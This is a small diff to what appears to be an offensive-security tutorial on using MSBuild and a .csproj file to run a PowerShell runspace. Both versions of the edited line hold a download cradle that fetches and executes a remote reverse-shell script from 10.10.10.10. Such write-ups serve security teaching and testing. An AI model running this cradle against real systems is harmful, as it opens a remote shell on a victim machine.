@@ -23,9 +23,9 @@ We can pass a ".csproj" (Visual Studio .NET C# Project file) to MSBuild and have
 
 <script src="https://gist.github.com/egre55/7a6b6018c9c5ae88c63bdb23879df4d0.js"></script>
 
-We will have the runspace download and execute our PowerShell reverse shell:
+We will use this runspace to download and execute our reverse shell using a PowerShell 3.0+ download cradle:
 
-```pipeline.Commands.AddScript("IEX (iwr 'http://10.10.10.10/shell.ps1')");  // powershell 3.0+ download cradle```
+```pipeline.Commands.AddScript("IEX (iwr 'http://10.10.10.10/shell.ps1')");```
 
 <script src="https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3.js"></script>
 
